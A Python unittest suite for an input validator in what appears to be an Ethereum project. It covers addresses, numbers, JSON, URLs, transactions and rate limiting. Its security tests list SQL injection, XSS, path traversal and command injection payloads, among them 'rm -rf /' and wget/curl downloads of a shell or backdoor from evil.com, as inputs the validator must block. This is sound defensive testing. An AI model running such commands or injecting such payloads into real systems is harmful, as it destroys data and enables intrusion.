#!/usr/bin/env python3
"""
Comprehensive Input Validation Test Suite
=========================================

Comprehensive test suite for the enhanced input validation system.
Tests all validation types, security patterns, and edge cases.

Usage:
    python test_input_validation.py [--verbose] [--security-only]
"""

import unittest
import json
import time
import logging
import argparse
from typing import Dict, Any, List, Optional
from pathlib import Path

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Import emergency functions
try:
    from emergency_input_sanitizer import (
        emergency_sanitize_string, emergency_validate_address,
        emergency_validate_numeric, SecurityError
    )
except ImportError:
    emergency_sanitize_string = None
    emergency_validate_address = None
    emergency_validate_numeric = None
    SecurityError = Exception

class InputValidationTestSuite(unittest.TestCase):
    """Comprehensive test suite for input validation"""
    
    @classmethod
    def setUpClass(cls):
        """Set up test environment"""
        cls.test_start_time = time.time()
        cls.security_test_count = 0
        cls.security_violations_caught = 0
          # Try to import validation modules
        cls.enhanced_available = False
        cls.integration_available = False
        cls.emergency_available = False
        
        try:
            from enhanced_input_validator import EnhancedInputValidator
            cls.enhanced_validator = EnhancedInputValidator(strict_mode=True)
            cls.enhanced_available = True
            logger.info("[OK] Enhanced validator available")
        except ImportError:
            logger.warning("[WARN] Enhanced validator not available")
        
        try:
            from input_validation_integration import IntegratedInputValidator
            cls.integrated_validator = IntegratedInputValidator(strict_mode=True)
            cls.integration_available = True
            logger.info("[OK] Integration module available")
        except ImportError:
            logger.warning("[WARN] Integration module not available")
        
        try:
            from emergency_input_sanitizer import (
                emergency_sanitize_string, emergency_validate_address,
                emergency_validate_numeric, SecurityError
            )
            cls.emergency_available = True
            logger.info("[OK] Emergency validator available")
        except ImportError as e:
            logger.warning(f"[WARN] Emergency validator not available: {e}")
    
    @classmethod
    def tearDownClass(cls):
        """Clean up after tests"""
        test_duration = time.time() - cls.test_start_time
        
        print(f"\n{'='*60}")
        print("INPUT VALIDATION TEST SUMMARY")
        print(f"{'='*60}")
        print(f"Test Duration: {test_duration:.2f} seconds")
        print(f"Security Tests: {cls.security_test_count}")
        print(f"Security Violations Caught: {cls.security_violations_caught}")
        print(f"Security Detection Rate: {(cls.security_violations_caught/max(cls.security_test_count,1)*100):.1f}%")
        
        # Cleanup integrated validator
        if cls.integration_available and hasattr(cls, 'integrated_validator'):
            cls.integrated_validator.cleanup()
    
    def _test_with_all_validators(self, value: Any, validation_type: str, 
                                should_pass: bool, description: str):
        """Test with all available validators"""
        results = []
        
        # Test with enhanced validator
        if self.enhanced_available:
            try:
                result = self.enhanced_validator.validate_with_context(value, validation_type)
                actual_pass = result.is_valid
                results.append(("Enhanced", actual_pass, result.warnings, result.security_flags))
            except Exception as e:
                results.append(("Enhanced", False, [str(e)], ["exception"]))
        
        # Test with integration module
        if self.integration_available:
            try:
                result = self.integrated_validator.validate_input(value, validation_type)
                actual_pass = result["valid"]
                results.append(("Integration", actual_pass, result.get("warnings", []), result.get("security_flags", [])))
            except Exception as e:
                results.append(("Integration", False, [str(e)], ["exception"]))        # Test with emergency validator (limited functionality)
        if self.emergency_available and validation_type in ["string", "ethereum_address", "number"]:
            try:
                if validation_type == "string" and emergency_sanitize_string:
                    emergency_sanitize_string(value)
                    results.append(("Emergency", True, [], []))
                elif validation_type == "ethereum_address" and emergency_validate_address:
                    emergency_validate_address(value)
                    results.append(("Emergency", True, [], []))
                elif validation_type == "number" and emergency_validate_numeric:
                    emergency_validate_numeric(value)
                    results.append(("Emergency", True, [], []))
            except Exception:
                results.append(("Emergency", False, ["Security error"], ["security_violation"]))
          # Analyze results
        for validator_name, actual_pass, warnings, security_flags in results:
            if validation_type in ["string"] and not should_pass:
                # For security tests expecting failure, we expect either failure or security flags
                if not actual_pass or security_flags:
                    self.security_violations_caught += 1
                
                # Assert that security violations are properly detected
                if any(keyword in description.lower() for keyword in ["security", "injection", "xss", "attack", "command", "traversal"]):
                    # Security tests should either fail validation OR have security flags
                    self.assertTrue(not actual_pass or len(security_flags) > 0, 
                                   f"{validator_name}: {description} should be blocked (actual_pass={actual_pass}, security_flags={security_flags})")
            else:
                # For normal tests, check expected behavior
                self.assertEqual(actual_pass, should_pass, 
                               f"{validator_name}: {description} - Expected {'pass' if should_pass else 'fail'}, got {'pass' if actual_pass else 'fail'}")
        
        return results
    
    def test_string_validation_normal(self):
        """Test normal string validation"""
        test_cases = [
            ("normal_text", True, "Normal text"),
            ("", True, "Empty string"),
            ("123", True, "Numeric string"),
            ("user@example.com", True, "Email format"),
            ("Hello World!", True, "Text with punctuation"),
            ("Unicode: 🚀", True, "Unicode characters"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "string", should_pass, description)
    
    def test_string_validation_length_limits(self):
        """Test string length limits"""
        test_cases = [
            ("a" * 100, True, "Normal length"),
            ("a" * 1000, True, "Long string"),
            ("a" * 10000, True, "Very long string"),
            ("a" * 100000, False, "Extremely long string"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "string", should_pass, description)
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        self.security_test_count += 15  # Count of security tests
        
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "1' OR 1=1 LIMIT 1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "1; DELETE FROM users WHERE 1=1; --",
            "' OR 1=1 /*",
            "admin'; INSERT INTO users VALUES ('hacker','pass'); --",
            "' HAVING 1=1 --",
            "' GROUP BY 1 --",
            "' ORDER BY 1 --",
            "'; WAITFOR DELAY '00:00:05'; --",
            "' AND BENCHMARK(5000000,MD5(1)) --"
        ]
        
        for payload in sql_injection_payloads:
            with self.subTest(payload=payload):
                self._test_with_all_validators(payload, "string", False, f"SQL injection: {payload}")
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        self.security_test_count += 12  # Count of security tests
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>"
        ]
        
        for payload in xss_payloads:
            with self.subTest(payload=payload):
                self._test_with_all_validators(payload, "string", False, f"XSS attack: {payload}")
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        self.security_test_count += 10  # Count of security tests
        
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo vulnerable",
            "|| ping -c 1 google.com",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; nc -l 1234",
            "| wget http://evil.com/shell.sh",
            "&& curl -O http://evil.com/backdoor",
            "; /bin/bash"
        ]
        
        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                self._test_with_all_validators(payload, "string", False, f"Command injection: {payload}")
    
    def test_path_traversal_detection(self):
        """Test path traversal pattern detection"""
        self.security_test_count += 8  # Count of security tests
        
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "file:///etc/passwd",
            "~/../../etc/passwd"
        ]
        
        for payload in path_traversal_payloads:
            with self.subTest(payload=payload):
                self._test_with_all_validators(payload, "string", False, f"Path traversal: {payload}")
    
    def test_ethereum_address_validation(self):
        """Test Ethereum address validation"""
        test_cases = [
            ("${CONTRACT_ADDRESS}", True, "Valid address"),
            ("${CONTRACT_ADDRESS}", False, "Zero address"),
            ("${CONTRACT_ADDRESS}", False, "Max address"),
            ("${CONTRACT_ADDRESS}", False, "Precompile address"),
            ("${CONTRACT_ADDRESS}", False, "Burn address"),
            ("invalid_address", False, "Invalid format"),
            ("0x742dA73Fe8e4B0b42d9D1B6C3F4d1F7b7b5c5c", False, "Too short"),
            ("${CONTRACT_ADDRESS}5c", False, "Too long"),
            ("742dA73Fe8e4B0b42d9D1B6C3F4d1F7b7b5c5c5c", False, "Missing 0x prefix"),
            ("0xZZZdA73Fe8e4B0b42d9D1B6C3F4d1F7b7b5c5c5c", False, "Invalid hex characters"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "ethereum_address", should_pass, description)
    
    def test_number_validation(self):
        """Test number validation"""
        test_cases = [
            ("123", True, "Simple integer"),
            ("123.456", True, "Decimal number"),
            ("0", True, "Zero"),
            ("-123", True, "Negative number"),
            ("1e18", True, "Scientific notation"),
            ("abc", False, "Non-numeric"),
            ("", False, "Empty string"),
            ("123abc", False, "Mixed alphanumeric"),
            (str(2**256), False, "Too large number"),
            (str(-(2**255) - 1), False, "Too small number"),
            ("∞", False, "Infinity symbol"),
            ("NaN", False, "NaN string"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "number", should_pass, description)
    
    def test_array_validation(self):
        """Test array validation"""
        if not self.enhanced_available and not self.integration_available:
            self.skipTest("No validators available for array testing")
        
        test_cases = [
            (["${CONTRACT_ADDRESS}"], True, "Single valid address"),
            ([], False, "Empty array"),
            (["${CONTRACT_ADDRESS}"] * 50, True, "Medium array"),
            (["${CONTRACT_ADDRESS}"] * 1001, False, "Too large array"),
            (["invalid_address"], False, "Invalid address in array"),
            (["${CONTRACT_ADDRESS}"], False, "Zero address in array"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "array", should_pass, description)
    
    def test_json_validation(self):
        """Test JSON validation"""
        if not self.enhanced_available and not self.integration_available:
            self.skipTest("No validators available for JSON testing")
        
        test_cases = [
            ('{"key": "value"}', True, "Simple JSON"),
            ('{"nested": {"key": "value"}}', True, "Nested JSON"),
            ('{"array": [1, 2, 3]}', True, "JSON with array"),
            ('invalid json', False, "Invalid JSON"),
            ('{"key": "<script>alert(1)</script>"}', False, "JSON with XSS"),
            ('{"key": "\'; DROP TABLE users; --"}', False, "JSON with SQL injection"),
            ('{}', True, "Empty object"),
            ('[]', False, "JSON array (not object)"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "json", should_pass, description)
    
    def test_url_validation(self):
        """Test URL validation"""
        if not self.enhanced_available and not self.integration_available:
            self.skipTest("No validators available for URL testing")
        
        test_cases = [
            ("https://example.com", True, "Valid HTTPS URL"),
            ("http://localhost:8080", True, "Localhost URL"),
            ("https://api.example.com/data", True, "API endpoint"),
            ("ftp://example.com", False, "FTP protocol"),
            ("javascript:alert(1)", False, "JavaScript protocol"),
            ("http://localhost/../../../etc/passwd", False, "Path traversal in URL"),
            ("https://192.168.1.1", False, "Private IP"),
            ("https://10.0.0.1", False, "Private IP range"),
            ("", False, "Empty URL"),
            ("not_a_url", False, "Invalid URL format"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "url", should_pass, description)
    
    def test_transaction_data_validation(self):
        """Test transaction data validation"""
        if not self.enhanced_available and not self.integration_available:
            self.skipTest("No validators available for transaction testing")
        
        valid_address = "${CONTRACT_ADDRESS}"
        
        test_cases = [
            ({
                "to": valid_address,
                "value": "1000000000000000000",
                "gasPrice": "20000000000",
                "gas": 21000,
                "data": "0x"
            }, True, "Valid transaction"),
            ({
                "to": "invalid_address",
                "value": "1000000000000000000"
            }, False, "Invalid to address"),
            ({
                "to": valid_address,
                "value": "abc"
            }, False, "Invalid value"),
            ({
                "to": valid_address,
                "gas": 20000
            }, False, "Gas too low"),
            ({
                "to": valid_address,
                "gas": 50000000
            }, False, "Gas too high"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "transaction_data", should_pass, description)
    
    def test_strategy_params_validation(self):
        """Test strategy parameters validation"""
        if not self.enhanced_available and not self.integration_available:
            self.skipTest("No validators available for strategy testing")
        
        valid_address = "${CONTRACT_ADDRESS}"
        
        test_cases = [
            ({
                "strategy_address": valid_address,
                "tokens": [valid_address],
                "amounts": ["1000000000000000000"],
                "slippage_tolerance": 0.01,
                "deadline": 300
            }, True, "Valid strategy params"),
            ({
                "strategy_address": "invalid",
                "tokens": [valid_address],
                "amounts": ["1000000000000000000"]
            }, False, "Invalid strategy address"),
            ({
                "strategy_address": valid_address,
                "tokens": [],
                "amounts": []
            }, False, "Empty arrays"),
            ({
                "strategy_address": valid_address,
                "tokens": [valid_address],
                "amounts": ["1000000000000000000", "2000000000000000000"]
            }, False, "Mismatched array lengths"),
        ]
        
        for value, should_pass, description in test_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, "strategy_params", should_pass, description)
    
    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        if not self.integration_available:
            self.skipTest("Integration module not available for rate limiting test")
          # Create a validator with low rate limits for testing
        from input_validation_integration import IntegratedInputValidator
        test_validator = IntegratedInputValidator(strict_mode=True)
          # Check if rate limiter is available
        if (not hasattr(test_validator, 'validator') or 
            test_validator.validator is None or 
            not hasattr(test_validator.validator, 'rate_limiter') or
            test_validator.validator.rate_limiter is None):
            self.skipTest("Rate limiter not available in integration module")
            
        test_validator.validator.rate_limiter.max_requests = 5
        test_validator.validator.rate_limiter.window_seconds = 1
        
        # Make requests up to the limit
        for i in range(5):
            result = test_validator.validate_input("test", "string", {"source_ip": "test_ip"})
            self.assertTrue(result["valid"], f"Request {i+1} should succeed")
        
        # The next request should be rate limited
        try:
            result = test_validator.validate_input("test", "string", {"source_ip": "test_ip"})
            # Should either fail or return rate limit error
            if result["valid"]:
                self.assertIn("rate_limit", str(result).lower())
        except Exception as e:
            self.assertIn("rate", str(e).lower())
        
        test_validator.cleanup()
    
    def test_caching_functionality(self):
        """Test validation result caching"""
        if not self.integration_available:
            self.skipTest("Integration module not available for caching test")
        
        test_value = "cache_test_value"
        context = {"source_ip": "cache_test"}
        
        # First request - should be slow
        start_time = time.time()
        result1 = self.integrated_validator.validate_input(test_value, "string", context)
        first_duration = time.time() - start_time
        
        # Second request - should be faster (cached)
        start_time = time.time()
        result2 = self.integrated_validator.validate_input(test_value, "string", context)
        second_duration = time.time() - start_time
        
        # Results should be identical
        self.assertEqual(result1["valid"], result2["valid"])
        self.assertEqual(result1["sanitized_value"], result2["sanitized_value"])
        
        # Second request should be faster (though this might not always be true in fast systems)
        # self.assertLess(second_duration, first_duration * 0.8)
    
    def test_batch_validation(self):
        """Test batch validation functionality"""
        if not self.integration_available:
            self.skipTest("Integration module not available for batch testing")
        
        test_items = [
            {"value": "test1", "type": "string"},
            {"value": "test2", "type": "string"},
            {"value": "${CONTRACT_ADDRESS}", "type": "ethereum_address"},
            {"value": "123", "type": "number"},
            {"value": "'; DROP TABLE users; --", "type": "string"},  # Should fail
        ]
        
        results = self.integrated_validator.validate_batch(test_items)
        
        self.assertEqual(len(results), len(test_items))
        
        # Check expected results
        self.assertTrue(results[0]["valid"])  # test1
        self.assertTrue(results[1]["valid"])  # test2
        self.assertTrue(results[2]["valid"])  # valid address
        self.assertTrue(results[3]["valid"])  # 123
        self.assertFalse(results[4]["valid"])  # SQL injection
    
    def test_performance_under_load(self):
        """Test performance under load"""
        if not self.integration_available:
            self.skipTest("Integration module not available for performance test")
        
        # Test with 100 validations
        start_time = time.time()
        
        for i in range(100):
            result = self.integrated_validator.validate_input(f"test_{i}", "string")
            self.assertTrue(result["valid"])
        
        duration = time.time() - start_time
        avg_time_per_validation = duration / 100
        
        # Should handle 100 validations in reasonable time (< 100ms per validation)
        self.assertLess(avg_time_per_validation, 0.1, "Validation should be fast")
        
        logger.info(f"Performance test: {avg_time_per_validation*1000:.2f}ms per validation")
    
    def test_edge_cases(self):
        """Test edge cases and boundary conditions"""
        edge_cases = [
            (None, "string", False, "None value"),
            ([], "string", False, "Empty list as string"),
            ({}, "string", False, "Empty dict as string"),
            (0, "string", True, "Zero as string"),
            (False, "string", True, "Boolean False as string"),
            (True, "string", True, "Boolean True as string"),
        ]
        
        for value, validation_type, should_pass, description in edge_cases:
            with self.subTest(value=value, description=description):
                self._test_with_all_validators(value, validation_type, should_pass, description)

class SecurityFocusedTests(unittest.TestCase):
    """Security-focused test cases"""
    
    def setUp(self):
        """Set up for security tests"""
        self.security_payloads_file = Path(__file__).parent / "security_payloads.json"
        
        # Default security payloads if file doesn't exist
        self.security_payloads = {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM passwords --",
                "admin'--",
                "1' OR 1=1 LIMIT 1 --"
            ],
            "xss": [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert('xss')",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<svg onload=alert(1)>"
            ],
            "command_injection": [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& echo vulnerable",
                "|| ping -c 1 google.com",
                "`cat /etc/passwd`"
            ]
        }
        
        # Load additional payloads if file exists
        if self.security_payloads_file.exists():
            with open(self.security_payloads_file, 'r') as f:
                additional_payloads = json.load(f)
                for category, payloads in additional_payloads.items():
                    if category in self.security_payloads:
                        self.security_payloads[category].extend(payloads)
                    else:
                        self.security_payloads[category] = payloads
    
    def test_comprehensive_security_patterns(self):
        """Test comprehensive security pattern detection"""
        total_tests = 0
        violations_caught = 0
        
        for category, payloads in self.security_payloads.items():
            for payload in payloads:
                total_tests += 1
                  # Test with all available validators
                caught_by_any = False
                
                try:
                    # Test with emergency validator
                    if emergency_sanitize_string:
                        try:
                            emergency_sanitize_string(payload)
                        except SecurityError:
                            caught_by_any = True
                except Exception:
                    pass
                
                try:
                    # Test with enhanced validator
                    from enhanced_input_validator import EnhancedInputValidator, SecurityViolationError
                    validator = EnhancedInputValidator(strict_mode=True)
                    try:
                        result = validator.validate_with_context(payload, "string")
                        if not result.is_valid or result.security_flags:
                            caught_by_any = True
                    except SecurityViolationError:
                        caught_by_any = True
                except ImportError:
                    pass
                
                if caught_by_any:
                    violations_caught += 1
                
                # Assert that at least one validator caught the security violation
                self.assertTrue(caught_by_any, f"Security payload not detected: {payload} ({category})")
        
        detection_rate = (violations_caught / total_tests) * 100
        print(f"\nSecurity Detection Rate: {detection_rate:.1f}% ({violations_caught}/{total_tests})")
        
        # Require at least 90% detection rate
        self.assertGreaterEqual(detection_rate, 90.0, "Security detection rate too low")

def run_tests(verbose=False, security_only=False):
    """Run the test suite"""
    # Configure test verbosity
    if verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Create test suite
    loader = unittest.TestLoader()
    
    if security_only:
        suite = loader.loadTestsFromTestCase(SecurityFocusedTests)
    else:
        suite = unittest.TestSuite()
        suite.addTests(loader.loadTestsFromTestCase(InputValidationTestSuite))
        suite.addTests(loader.loadTestsFromTestCase(SecurityFocusedTests))
    
    # Run tests
    runner = unittest.TextTestRunner(
        verbosity=2 if verbose else 1,
        stream=None,
        descriptions=True,
        failfast=False
    )
    
    print("[SECURITY] Input Validation Test Suite")
    print("=" * 50)
    
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 50)
    print("TEST SUMMARY")
    print("=" * 50)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Success rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print("\nFAILURES:")
        for test, traceback in result.failures:
            print(f"  {test}: {traceback.split('AssertionError:')[-1].strip()}")
    
    if result.errors:
        print("\nERRORS:")
        for test, traceback in result.errors:
            print(f"  {test}: {traceback.split('Exception:')[-1].strip()}")
    
    return result.wasSuccessful()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run input validation tests")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--security-only", action="store_true", help="Run only security tests")
    
    args = parser.parse_args()
    
    success = run_tests(verbose=args.verbose, security_only=args.security_only)
    
    if success:
        print("\n[SUCCESS] All tests passed!")
        exit(0)
    else:
        print("\n[FAILED] Some tests failed!")
        exit(1)
